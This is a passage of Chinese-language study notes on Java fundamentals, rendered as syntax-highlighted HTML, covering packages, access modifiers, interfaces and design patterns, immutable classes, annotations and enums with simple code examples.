function_">dadoudou</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        System.out.println(person.age);</span><br><span class="line">        System.out.println(person.sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>实际开发中，我们通常不在当前类中直接创建对象并使用它，而是放在<strong>使用对象</strong>的类中</p>
<ol type="1">
<li>person 被称为对象 Person 的<code>引用变量</code></li>
</ol></li>
<li><p><code>匿名对象</code>。匿名对象意味着没有引用变量，它只能在创建的时候被使用一次。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Person</span>().initialize(<span class="string">&quot;沉默王二&quot;</span>, <span class="number">18</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>还有一种“<code>默认</code>”的权限修饰符，是缺省的，它修饰的类可以访问同一个包下面的其他类</p></li>
</ol>
<h3 id="包">包</h3>
<ol type="1">
<li><p>使用<code>package</code>来解决名字冲突。</p></li>
<li><p>包没有<code>父子关系</code>。java.util和java.util.zip是不同的包，两者没有任何继承关系。</p></li>
<li><p>没有定义包名的<code>class</code>，它使用的是默认包</p></li>
<li><p>位于同一个包的类，可以访问包作用域的<strong>字段和方法</strong>。，不用<code>public</code>、<code>protected</code>、<code>private</code>修饰的字段和方法就是包作用域</p></li>
<li><p>引用小军的<code>mr.jun.Arrays</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line">mr.jun.<span class="type">Arrays</span> <span class="variable">arrays</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">mr</span>.jun.Arrays();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="keyword">import</span> mr.jun.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Arrays</span> <span class="variable">arrays</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arrays</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 导入mr.jun包的所有class:</span></span><br><span class="line"><span class="keyword">import</span> mr.jun.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Arrays</span> <span class="variable">arrays</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arrays</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入System类的所有静态字段和静态方法:</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.System.*;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="方法">方法</h3>
<h3 id="可变参数">可变参数</h3>
<ol type="1">
<li>当使用<code>可变参数</code>的时候，实际上是先创建了一个<code>数组</code>，该数组的大小就是可变参数的个数，然后将参数放入数组当中，再将数组传递给被调用的方法。</li>
</ol>
<h3 id="native-本地方法">native 本地方法</h3>
<ol type="1">
<li><code>Java Native Interface (JNI)</code>标准就成为 Java
平台的一部分，它允许 Java 代码和其他语言编写的代码进行交互</li>
<li>使用 Java
与本地已编译的代码交互，通常会丧失平台<code>可移植性</code>，但是，有些情况下这样做是可以接受的，甚至是必须的，比如，使用一些旧的库，与<code>硬件、操作系统</code>进行交互，或者为了提高程序的<code>性能</code>。</li>
</ol>
<h3 id="访问权限修饰符">访问权限修饰符</h3>
<ol type="1">
<li><code>默认访问权限</code>（包访问权限）：如果一个类的方法或变量被包访问权限修饰，也就意味着只能在同一个包中的其他类中显示地调用该类的方法或者变量，在不同包中的类中不能显式地调用该类的方法或变量。
<code>private</code>：如果一个类的方法或者变量被 private
修饰，那么这个类的方法或者变量只能在该类本身中被访问，在类外以及其他类中都不能显式的进行访问。
<code>protected</code>：如果一个类的方法或者变量被 protected
修饰，对于同一个包的类，这个类的方法或变量是可以被访问的。对于不同包的类，只有继承于该类的类才可以访问到该类的方法或者变量。
<code>public</code>：被 public
修饰的方法或者变量，在任何地方都是可见的。</li>
</ol>
<h3 id="代码初始化块">代码初始化块</h3>
<h3 id="抽象类">抽象类</h3>
<ol type="1">
<li>抽象类是不能实例化的</li>
<li>如果一个类定义了一个或多个抽象方法，那么这个类必须是抽象类。</li>
<li>抽象类中既可以定义抽象方法，也可以定义普通方法</li>
</ol>
<h3 id="接口">接口</h3>
<ol type="1">
<li><p>没有使用 <code>private</code>、<code>default</code> 或者
<code>static</code>
关键字修饰的方法是<strong>隐式抽象</strong>的，在编译的时候会自动加上
<code>public abstract</code> 修饰符</p></li>
<li><p>需要定义一个类去<code>实现</code>接口</p></li>
<li><p>Java
原则上只支持单一继承，但通过接口可以实现<code>多重继承</code>的目的。</p></li>
<li><p>多态</p>
<p>Circle 类实现了 Shape 接口，并重写了 <code>name()</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;圆&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Square 类也实现了 Shape 接口，并重写了 <code>name()</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;正方形&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后来看测试类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Shape&gt; shapes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="type">Shape</span> <span class="variable">circleShape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line"><span class="type">Shape</span> <span class="variable">squareShape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line"></span><br><span class="line">shapes.add(circleShape);</span><br><span class="line">shapes.add(squareShape);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Shape shape : shapes) &#123;</span><br><span class="line">    System.out.println(shape.name());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>接口的三种模式</p>
<ol type="1">
<li><p><code>策略模式</code>的思想是，针对一组算法，将每一种算法封装到具有共同接口的实现类中，接口的设计者可以在不影响调用者的情况下对算法做出改变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口：教练</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line">    <span class="comment">// 方法：防守</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 何塞·穆里尼奥</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hesai</span> <span class="keyword">implements</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;防守赢得冠军&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 德普·瓜迪奥拉</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Guatu</span> <span class="keyword">implements</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进攻就是最好的防守&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="comment">// 参数为接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">(Coach coach)</span> &#123;</span><br><span class="line">        coach.defend();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 为同一个方法传递不同的对象</span></span><br><span class="line">        defend(<span class="keyword">new</span> <span class="title class_">Hesai</span>());</span><br><span class="line">        defend(<span class="keyword">new</span> <span class="title class_">Guatu</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>适配器模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象类实现接口，并置空方法</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AdapterCoach</span> <span class="keyword">implements</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">()</span> &#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新类继承适配器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hesai</span> <span class="keyword">extends</span> <span class="title class_">AdapterCoach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">defend</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;防守赢得冠军&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Coach</span> <span class="variable">coach</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hesai</span>();</span><br><span class="line">        coach.defend();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果我们只需要对其中<strong>一个方法</strong>进行实现的话，就可以使用一个抽象类作为<strong>中间件</strong>，即适配器（AdapterCoach），用这个抽象类实现接口，并对抽象类中的方法<strong>置空</strong>（方法体只有一对花括号），这时候，新类就可以绕过接口，继承抽象类，我们就可以只对需要的方法进行覆盖，而不是接口中的所有方法</p></li>
<li><p>工厂模式</p>
<p>什么工厂生产什么，比如说宝马工厂生产宝马，奔驰工厂生产奔驰，A
级学院毕业 A 级教练，C 级学院毕业 C 级教练。示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 教练</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">command</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 教练学院</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">CoachFactory</span> &#123;</span><br><span class="line">    Coach <span class="title function_">createCoach</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A级教练</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ACoach</span> <span class="keyword">implements</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">command</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是A级证书教练&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A级教练学院</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ACoachFactory</span> <span class="keyword">implements</span> <span class="title class_">CoachFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Coach <span class="title function_">createCoach</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ACoach</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C级教练</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CCoach</span> <span class="keyword">implements</span> <span class="title class_">Coach</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">command</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是C级证书教练&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C级教练学院</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CCoachFactory</span> <span class="keyword">implements</span> <span class="title class_">CoachFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Coach <span class="title function_">createCoach</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CCoach</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">(CoachFactory factory)</span> &#123;</span><br><span class="line">        factory.createCoach().command();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 对于一支球队来说，需要什么样的教练就去找什么样的学院</span></span><br><span class="line">        <span class="comment">// 学院会介绍球队对应水平的教练。</span></span><br><span class="line">        create(<span class="keyword">new</span> <span class="title class_">ACoachFactory</span>());</span><br><span class="line">        create(<span class="keyword">new</span> <span class="title class_">CCoachFactory</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>抽象类是普通类与接口之间的一种中庸之道。</p>
<ol type="1">
<li>接口与抽象类的不同之处在于：
<ul>
<li>1、抽象类可以有方法体的方法，但接口没有（Java 8 以前）。</li>
<li>2、接口中的成员变量隐式为
<code>static final</code>，但抽象类不是的。</li>
<li>3、一个类可以实现多个接口，但只能继承一个抽象类。</li>
<li>抽象类可以提供成员方法的实现细节，而接口中只能存在 public abstract
方法；</li>
<li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 public
static final 类型的；</li>
<li>接口中不能含有静态代码块，而抽象类可以有静态代码块；</li>
</ul></li>
</ol></li>
<li><p>xx</p>
<ol type="1">
<li>接口是隐式抽象的，所以声明时没有必要使用 <code>abstract</code>
关键字；</li>
<li>接口的每个方法都是隐式抽象的，所以同样不需要使用
<code>abstract</code> 关键字；</li>
<li>接口中的方法都是隐式 <code>public</code> 的。</li>
</ol></li>
<li><p>继承抽象类的子类和抽象类本身是一种 <code>is-a</code>
的关系</p></li>
<li><p>抽象类是对整个类整体进行抽象，包括属性、行为，但是接口却是对<strong>类局部（</strong>行为）进行抽象。</p></li>
</ol>
<h3 id="内部类">内部类</h3>
<ol type="1">
<li>内部类可以<strong>随心所欲</strong>地访问外部类的成员，但外部类想要访问内部类的成员，就不那么容易了，必须先创建一个成员内部类的<strong>对象</strong>，再通过这个对象来访问</li>
</ol>
<h3 id="封装继承和多态">封装、继承和多态</h3>
<ol type="1">
<li>子类的构造过程必须调用其父类的构造方法：</li>
<li>子类的构造过程必须调用其父类的构造方法：</li>
</ol>
<h3 id="thissuper">this|super</h3>
<ol type="1">
<li><p>不过，需要注意的是，<code>this()</code>
必须放在构造方法的第一行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeParamConstrutor</span> &#123;</span><br><span class="line">    InvokeParamConstrutor() &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InvokeParamConstrutor(<span class="type">int</span> count) &#123;</span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokeParamConstrutor</span> <span class="variable">invokeConstrutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeParamConstrutor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="final">final</h3>
<ol type="1">
<li>如果一个类使用了 final 关键字修饰，那么它就无法被继承</li>
</ol>
<h3 id="instanceof">instanceof</h3>
<ol type="1">
<li>对象、接口</li>
<li>父类：<code>object</code></li>
</ol>
<h3 id="不可变对象">不可变对象</h3>
<ol type="1">
<li><p>一个类的对象在通过构造方法创建后如果状态不会再被改变，那么它就是一个不可变（immutable）类。它的所有成员变量的赋值仅在构造方法中完成，不会提供任何
setter 方法供外部类去修改</p></li>
<li><p>为了保护状态的原子性、可见性、有序性，我们程序员可以说是竭尽所能。其中，synchronized（同步）关键字是最简单最入门的一种解决方案。</p>
<p>假如说类是不可变的，那么对象的状态就也是不可变的。这样的话，每次修改对象的状态，就会产生一个新的对象供不同的线程使用，我们程序员就不必再担心并发问题了。</p></li>
<li><p><code>字符串常量池</code>是 Java
堆内存中一个特殊的存储区域，当创建一个 String
对象时，假如此字符串在常量池中不存在，那么就创建一个；假如已经存在，就不会再创建了，而是直接引用已经存在的对象</p></li>
<li><p>因为字符串是不可变的，所以在它创建的时候，其
<code>hashCode</code> 就被缓存了，因此非常适合作为哈希值（比如说作为
HashMap 的键），多次调用只返回同一个值，来提高效率。</p></li>
<li><p>就像之前说的那样，如果对象的状态是可变的，那么在多线程环境下，就很容易造成不可预期的结果。而
String 是不可变的，就可以在多个线程之间共享，不需要同步处理。</p></li>
</ol>
<h3 id="手撸一个不可变类">手撸一个不可变类</h3>
<ol type="1">
<li><p>手撸一个不可变类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Writer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Writer</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="java注解">Java注解</h3>
<ol type="1">
<li><p>注解的类型一共有 11 种，定义在 ElementType 枚举中。</p>
<p>1）<code>TYPE</code>：用于类、接口、注解、枚举</p>
<p>2）<code>FIELD</code>：用于字段（类的成员变量），或者枚举常量</p>
<p>3）<code>METHOD</code>：用于方法</p>
<p>4）<code>PARAMETER</code>：用于普通方法或者构造方法的参数</p>
<p>5）<code>CONSTRUCTOR</code>：用于构造方法</p>
<p>6）<code>LOCAL_VARIABLE</code>：用于变量</p>
<p>7）<code>ANNOTATION_TYPE</code>：用于注解</p>
<p>8）<code>PACKAGE</code>：用于包</p>
<p>9）<code>TYPE_PARAMETER</code>：用于泛型参数</p>
<p>10）<code>TYPE_USE</code>：用于声明语句、泛型或者强制转换语句中的类型</p>
<p>11）<code>MODULE</code>：用于模块</p></li>
<li><p>在Java中,编译时和运行时主要有以下区别:</p>
<p><code>编译时</code>:</p>
<ul>
<li>Java代码被编译成字节码的过程</li>
<li>进行语法检查、编译错误提示</li>
<li>对类型、方法、字段访问等进行静态检查</li>
<li>生成CLASS文件</li>
</ul>
<p><code>运行时</code>:</p>
<ul>
<li>JVM加载CLASS文件,解释执行字节码的过程</li>
<li>对未编译错误进行运行时异常检查</li>
<li>进行动态绑定、反射等机制的运行时检查</li>
<li>变量初始化,对象创建,语句执行等行为发生</li>
</ul>
<p><strong>主要区别</strong>:</p>
<ul>
<li>编译时进行静态检查,运行时进行动态检查</li>
<li>编译时可发现大部分错误,运行时可发现剩余错误</li>
<li>编译时无程序状态,运行时程序状态不断变化</li>
<li>编译时确定类型安全,运行时允许通过反射/代理绕过</li>
</ul></li>
<li><p>注解的生命周期有 3 种策略</p>
<p>1）<code>SOURCE</code>：在源文件中有效，被编译器丢弃。</p>
<p>2）<code>CLASS</code>：在编译器生成的字节码文件中有效，但在运行时会被处理类文件的
JVM 丢弃。</p>
<p>3）<code>RUNTIME</code>：在运行时有效。这也是注解生命周期中最常用的一种策略，它允许程序通过反射的方式访问注解，并根据注解的定义执行相应的代码。</p></li>
</ol>
<h3 id="枚举">枚举</h3>
<ol type="1">
<li><p>例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PlayerType</span> &#123;</span><br><span class="line">    TENNIS,</span><br><span class="line">    FOOTBALL,</span><br><span class="line">    BASKETBALL</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>既然枚举是一种特殊的类，那它其实是可以定义在一个类的内部的，这样它的作用域就可以限定于这个外部类中使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> PlayerType type;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PlayerType</span> &#123;</span><br><span class="line">        TENNIS,</span><br><span class="line">        FOOTBALL,</span><br><span class="line">        BASKETBALL</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBasketballPlayer</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> getType() == PlayerType.BASKETBALL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> PlayerType <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(PlayerType type)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><code>==</code>运算符比较的时候，如果两个对象都为
null，并不会发生 <code>NullPointerException</code>，而
<code>equals()</code> 方法则会。</p></li>
<li><p>另外，
“==”运算符会在编译时进行检查，如果两侧的类型不匹配，会提示错误，而
<code>equals()</code> 方法则不会。</p></li>
<li><p>枚举还可用于 switch 语句，和基本数据类型的用法一致</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (playerType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TENNIS:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;网球运动员费德勒&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> FOOTBALL:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;足球运动员C罗&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> BASKETBALL:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;篮球运动员詹姆斯&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> UNKNOWN:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;未知&quot;</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                <span class="string">&quot;运动员类型: &quot;</span> + playerType);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>如果枚举中需要包含更多信息的话，可以为其添加一些字段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PlayerType</span> &#123;</span><br><span class="line">    TENNIS(<span class="string">&quot;网球&quot;</span>),</span><br><span class="line">    FOOTBALL(<span class="string">&quot;足球&quot;</span>),</span><br><span class="line">    BASKETBALL(<span class="string">&quot;篮球&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    PlayerType(String name) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><code>EnumSet</code> 是一个专门针对枚举类型的 Set
接口（后面会讲）的实现类，它是处理枚举类型数据的一把利器，非常高效</p></li>
<li><p>因为 EnumSet 是一个<code>抽象类</code>，所以创建 EnumSet
时不能使用 new 关键字。不过，EnumSet
提供了很多有用的<code>静态工厂方法</code></p>
<ol type="1">
<li><p>使用 <code>noneOf()</code> 静态工厂方法创建了一个空的 PlayerType
类型的 EnumSet；使用 <code>allOf()</code> 静态工厂方法创建了一个包含所有
PlayerType 类型的 EnumSet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnumSetTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PlayerType</span> &#123;</span><br><span class="line">        TENNIS,</span><br><span class="line">        FOOTBALL,</span><br><span class="line">        BASKETBALL</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        EnumSet&lt;PlayerType&gt; enumSetNone = EnumSet.noneOf(PlayerType.class);</span><br><span class="line">        System.out.println(enumSetNone);</span><br><span class="line"></span><br><span class="line">        EnumSet&lt;PlayerType&gt; enumSetAll = EnumSet.allOf(PlayerType.class);</span><br><span class="line">        System.out.println(enumSetAll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>有了 EnumSet 后，就可以使用 Set 的一些方法了</p></li>
</ol></li>
<li><p>还有 <code>EnumMap</code>，是一个专门针对枚举类型的 Map
接口的实现类，它可以将枚举常量作为键来使用。EnumMap
的<strong>效率</strong>比 HashMap 还要高，可以直接通过数组下标（枚举的
